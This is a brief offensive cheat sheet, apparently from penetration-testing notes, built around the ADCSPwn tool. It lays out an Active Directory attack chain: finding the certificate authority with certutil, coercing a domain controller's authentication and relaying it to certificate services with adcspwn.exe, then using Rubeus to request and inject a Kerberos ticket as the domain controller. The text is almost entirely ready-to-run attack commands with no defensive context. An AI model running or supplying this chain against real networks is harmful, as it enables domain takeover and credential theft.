### Source
https://github.com/bats3c/ADCSPwn  

### Find certificate autthority
```
certutil.exe
```

### Coerce authentication from machine account and relay to certificate service, write certificate to file
```
adcspwn.exe --adcs <certificateAuthority> --remote <domainController> --output <base64Certificate>
```

### Request kerberos TGT
```
Rubeus.exe asktgt /outfile:<file> /user:<domainController> /ptt /certificate:<base64Certificate>
```

